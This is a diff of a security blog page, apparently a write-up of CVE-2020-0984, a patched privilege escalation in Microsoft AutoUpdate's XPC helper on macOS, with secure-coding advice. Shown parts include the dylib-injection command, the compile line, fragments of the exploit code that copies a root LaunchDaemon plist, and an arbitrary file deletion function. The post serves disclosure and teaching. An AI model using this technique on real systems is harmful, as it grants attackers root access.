@@ -17,8 +17,8 @@
 <meta property="og:description" content="Microsoft AutoUpdate macOS privilege escalation vulnerability (CVE-2020-0984) Introduction This is the third post in my series which is trying to help Apple developers to avoid typical insecure coding practices. This one will highlight why XPC client hardening and proper verification is extremely important when we use XPC messaging on macOS between clients that run as a normal user and services that run as root. If this validation is not right, it opens up the possibility for an attacker to run privileged commands or worse case, achieve full privilege escalation on the system." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://theevilbit.github.io/posts/secure_coding_xpc_part3/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2020-05-29T00:00:00&#43;00:00" />
-<meta property="article:modified_time" content="2020-05-29T00:00:00&#43;00:00" />
+<meta property="article:published_time" content="2020-05-29T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-05-29T00:00:00+00:00" />
 
 
 
@@ -54,7 +54,7 @@
     <link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-32x32.png" sizes="32x32">
     <link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-16x16.png" sizes="16x16">
 
-    <meta name="generator" content="Hugo 0.84.1" />
+    <meta name="generator" content="Hugo 0.89.2" />
   </head>
 
   <body class=" ">
@@ -153,7 +153,7 @@
 <p>Microsoft uses a privileged helper tool to update MS Office applications on macOS, called Microsoft AutoUpdate (MSAU). Privileged helper tools run as root, and these services are typically installed to perform specific tasks for the client application that would require privilege elevation otherwise. Since the introduction of XPC, these tools mostly utilize XPC as an IPC (Inter Process Communication). Almost 2 years ago <a href="https://twitter.com/CodeColorist">(@CodeColorist)</a> already found a local privilege escalation in this software which was a weakness in its XPC connection verification and one of the offered functions, here is the link to his writeup: <a href="https://medium.com/0xcc/cve-2018-8412-ms-office-2016-for-mac-privilege-escalation-via-a-legcy-package-7fccdbf71d9b">CVE-2018–8412: MS Office 2016 for Mac Privilege Escalation via a Legacy Package</a>. Although Microsoft patched the vulnerable XPC function <code>installUpdateWithPackage</code>, they introduced new functionality in later versions, and as the client verification still wasn&rsquo;t fixed properly it introduced a new local privilege escalation vulnerability. This was patched by Microsoft at the 15th of April 2020, and assigned <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0984">CVE-2020-0984</a>. Unfortunately this is common theme that vendors don&rsquo;t fix XPC vulnerabilities properly, and many time we can re-exploit them.</p>
 <h2 id="cve-2020-0984-exploitation">CVE-2020-0984 exploitation</h2>
 <p>When the MSAU privileged helper tool accepts a connection from a connecting client, it will perform the following signature check against it in its <code>shouldAcceptNewConnection</code> function:</p>
-<pre><code>&quot;(identifier \&quot;com.microsoft.autoupdate2\&quot; or identifier \&quot;com.microsoft.autoupdate.fba\&quot; or identifier \&quot;com.microsoft.autoupdate.cli\&quot;) and anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] and certificate leaf[field.1.2.840.113635.100.6.1.&quot; and certificate leaf[subject.OU] = UBF8T346G9
+<pre tabindex="0"><code>&quot;(identifier \&quot;com.microsoft.autoupdate2\&quot; or identifier \&quot;com.microsoft.autoupdate.fba\&quot; or identifier \&quot;com.microsoft.autoupdate.cli\&quot;) and anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] and certificate leaf[field.1.2.840.113635.100.6.1.&quot; and certificate leaf[subject.OU] = UBF8T346G9
 </code></pre><p>This will check if:</p>
 <ol>
 <li>The connecting process is signed by Apple</li>
@@ -172,7 +172,7 @@
 <p>Additionally to these checks, the client mustn&rsquo;t hold the <code>com.apple.security.cs.disable-library-validation</code> entitlement, because that will allow 3rd party dylib injection. The <code>com.apple.security.get-task-allow</code> also must&rsquo;t be present as that would allow injection via Mach task ports.</p>
 <p>Lack of either of these verification means that if we can find an old version of the applications (with the same bundle ID), which doesn&rsquo;t have hardened runtime or library validation enabled, then we can use that, inject our dylib into it, and we will be able to talk to the privilege helper tool, completely bypassing the verification, because the old client will also satisfy the certification requirements. Missing hardened runtime is typical for applications from the Mojave period or before as hardened runtime wasn&rsquo;t mandatory and before Mojave it wasn&rsquo;t even available.</p>
 <p>After some search I found an old version of MSAU which satisfies our needs as it&rsquo;s not hardened and also has one of the acceptable bundle IDs. It can be downloaded from here: <a href="https://www.techspot.com/downloads/7052-microsoft-autoupdate.html">Microsoft AutoUpdate (MAU) 3.14 Download - TechSpot</a>. We can verify that with checking its code signing properties.</p>
-<pre><code>% codesign -dv Microsoft\ AutoUpdate.app
+<pre tabindex="0"><code>% codesign -dv Microsoft\ AutoUpdate.app
 Executable=/Users/user/Downloads/Microsoft AutoUpdate.app/Contents/MacOS/Microsoft AutoUpdate
 Identifier=com.microsoft.autoupdate2
 Format=app bundle with Mach-O thin (x86_64)
@@ -185,7 +185,7 @@ Sealed Resources version=2 rules=13 files=307
 Internal requirements count=1 size=188
 </code></pre><p>We can see that it has one of the bundle IDs we need <code>com.microsoft.autoupdate2</code> and also the same team ID the verification expects, <code>UBF8T346G9</code>.</p>
 <p>Now that we can talk to the helper tool, with some reverse engineering we can check if it has any promising function. Running <code>class-dump</code> against the binary <code>/Library/PrivilegedHelperTools/com.microsoft.autoupdate.helper</code> reveals that its functionality has been extended since 2018, it has more interfaces available through XPC. The <code>MAUHelperToolProtocol</code> describe the available functions we can call.</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec"><span style="color:#069;font-weight:bold">@protocol</span> <span style="color:#0a8;font-weight:bold">MAUHelperToolProtocol</span> <span style="color:#555">&lt;</span>NSObject<span style="color:#555">&gt;</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec"><span style="color:#069;font-weight:bold">@protocol</span> <span style="color:#0a8;font-weight:bold">MAUHelperToolProtocol</span> <span style="color:#555">&lt;</span>NSObject<span style="color:#555">&gt;</span>
 <span style="color:#555">-</span> (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#99f">removeInstallLogFile</span>:(NSString <span style="color:#555">*</span>)arg1;
 - (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">logString:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">atLevel:</span>(<span style="color:#078;font-weight:bold">int</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">fromAppName:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg3</span>;
 - (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">removeClone:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSString <span style="color:#555">*</span>))<span style="color:#033">arg2</span>;
@@ -194,7 +194,7 @@ Internal requirements count=1 size=188
 - (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">installUpdateWithPackage:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">withXMLPath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">withAppPath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg3</span> <span style="color:#c0f">withClonePath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg4</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSString <span style="color:#555">*</span>))<span style="color:#033">arg5</span>;
 <span style="color:#069;font-weight:bold">@end</span>
 </code></pre></div><p>The <code>createCloneFromApp</code> sounded interesting, if we take a closer look, we will see that it simply copies the file passed into the location given without any further checks, and it uses the <code>[NSFileManager copyItemAtPath]</code> for this. We can use Hopper to decompile the function.</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec">-(<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">createCloneFromApp:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">withClonePath:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg3</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg4</span> {
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec">-(<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">createCloneFromApp:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">withClonePath:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg3</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg4</span> {
     var_48 <span style="color:#555">=</span> [arg2 <span style="color:#069;font-weight:bold">retain</span>];
     r12 <span style="color:#555">=</span> [arg3 <span style="color:#069;font-weight:bold">retain</span>];
     rax <span style="color:#555">=</span> [arg4 <span style="color:#069;font-weight:bold">retain</span>];
@@ -226,7 +226,7 @@ Internal requirements count=1 size=188
     rbx <span style="color:#555">=</span> [r13 <span style="color:#99f">copyItemAtPath</span>:r12 <span style="color:#99f">toPath</span>:var_50 <span style="color:#99f">error</span>:r8];
     r15 <span style="color:#555">=</span> [var_78 <span style="color:#069;font-weight:bold">retain</span>];
 </code></pre></div><p>If we can copy a file as root, with a source and destination we control, it&rsquo;s a trivial privilege escalation on macOS (and normally also on any other OS as well). Our plan will be to copy a <code>PLIST</code> file into <code>/Library/LaunchDaemons</code>, which will contain a command to run a script upon startup. Any script/application run from this directory will run as <code>root</code>. Our exploit is a short NSXPC client code, that will invoke the <code>createCloneFromApp</code> method of the XPC service. As it&rsquo;s a dylib, the code is placed into the constructor. The exploit will create a PLIST file in the location we need, and include a short shell script to create a file at <code>/Library/msauexp.txt</code>, where only root has write access.</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec"><span style="color:#099">#import &lt;Foundation/Foundation.h&gt;
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec"><span style="color:#099">#import &lt;Foundation/Foundation.h&gt;
 </span><span style="color:#099"></span>
 <span style="color:#069;font-weight:bold">static</span> NSString<span style="color:#555">*</span> kXPCHelperMachServiceName <span style="color:#555">=</span> <span style="color:#c30">@&#34;com.microsoft.autoupdate.helper&#34;</span>;
 
@@ -281,13 +281,13 @@ __attribute__((constructor))
     <span style="color:#069;font-weight:bold">return</span>;
 }
 </code></pre></div><p>Compile:</p>
-<pre><code>gcc -dynamiclib -framework Foundation mauexp.m -o mauexp.dylib
+<pre tabindex="0"><code>gcc -dynamiclib -framework Foundation mauexp.m -o mauexp.dylib
 </code></pre><p>To run our exploit, we need to inject it into the old MSAU application.</p>
-<pre><code>DYLD_INSERT_LIBRARIES=mauexp.dylib ~/Downloads/Microsoft\ AutoUpdate.app/Contents/MacOS/Microsoft\ AutoUpdate`
+<pre tabindex="0"><code>DYLD_INSERT_LIBRARIES=mauexp.dylib ~/Downloads/Microsoft\ AutoUpdate.app/Contents/MacOS/Microsoft\ AutoUpdate`
 </code></pre><p>Upon reboot our embedded script will be run, and eventually a file will be created at <code>/Library/mauresult.txt</code>.</p>
 <h2 id="removeclone---arbitrary-file-deletion-vulnerability">removeClone - Arbitrary file deletion vulnerability</h2>
 <p>As we can talk to the privilege helper tool, we can also invoke its other functions. The function <code>removeClone</code> offers an arbitrary file deletion. We can pass in a filename, and that will be deleted, without any further checks.</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec"><span style="color:#09f;font-style:italic">/* @class MAUHelperTool */</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec"><span style="color:#09f;font-style:italic">/* @class MAUHelperTool */</span>
 -(<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">removeClone:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg3</span> {
     r13 <span style="color:#555">=</span> <span style="color:#366">self</span>;
     r14 <span style="color:#555">=</span> [arg2 <span style="color:#069;font-weight:bold">retain</span>];
@@ -317,7 +317,7 @@ d. The connecting process has a minimum software version, where the fix has been
 <ol start="2">
 <li>Beyond that the client which is allowed to connect has to be compiled with hardened runtime or library validation, without possessing the following entitlements:</li>
 </ol>
-<pre><code>com.apple.security.cs.allow-dyld-environment-variables
+<pre tabindex="0"><code>com.apple.security.cs.allow-dyld-environment-variables
 com.apple.security.cs.disable-library-validation
 com.apple.security.get-task-allow
 </code></pre><p>as these entitlements would allow another process to inject code into the app, and thus allowing it to talk to the helper tool.</p>
